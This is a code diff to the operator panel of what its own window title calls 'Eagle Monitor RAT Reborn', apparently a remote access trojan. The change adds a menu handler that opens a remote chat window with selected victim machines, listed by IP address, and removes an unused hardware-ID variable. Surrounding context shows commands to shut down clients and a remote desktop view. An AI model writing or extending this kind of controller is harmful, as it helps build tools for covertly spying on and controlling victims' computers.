@@ -93,7 +93,6 @@ namespace EagleMonitor
 
         private void Main_Load(object sender, EventArgs e)
         {
-
             new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(dataGridView1, guna2VScrollBar1, true);
             this.Text = "Eagle Monitor RAT Reborn" + " @Welcome " + Environment.UserName + " !";
             this.label1.Text = "Eagle Monitor RAT Reborn" + " @Welcome " + Environment.UserName + " !";
@@ -458,6 +457,36 @@ namespace EagleMonitor
             }
         }
 
+        private void chatToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
+            {
+                string IP = dataGridViewRow.Cells[2].Value.ToString();
+                try
+                {
+                    if (ClientHandler.ClientHandlersList[IP].chatForm != null)
+                    {
+                        ClientHandler.ClientHandlersList[IP].chatForm.Show();
+                    }
+                    else
+                    {
+                        ClientHandler.ClientHandlersList[IP].chatForm = new RemoteChatForm(IP);
+                        ClientHandler.ClientHandlersList[IP].chatForm.Show();
+                    }
+                }
+                catch (Exception)
+                {
+                    ClientHandler.ClientHandlersList[IP].chatForm = new RemoteChatForm(IP);
+                    ClientHandler.ClientHandlersList[IP].chatForm.Show();
+                }
+                finally
+                {
+                    ClientHandler.ClientHandlersList[IP].chatForm.Text = "Chat: " + ClientHandler.ClientHandlersList[IP].fullName;     
+                }
+            }
+        }
+
+
         private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
         {
             PowerPacket powerPacket = new PowerPacket(PacketType.POWER_SHUTDOWN);
@@ -540,7 +569,6 @@ namespace EagleMonitor
             foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
             {
                 string IP = dataGridViewRow.Cells[2].Value.ToString();
-                string HWID = dataGridViewRow.Cells[1].Value.ToString();
                 try
                 {
                     if (ClientHandler.ClientHandlersList[IP].remoteDesktopForm != null)
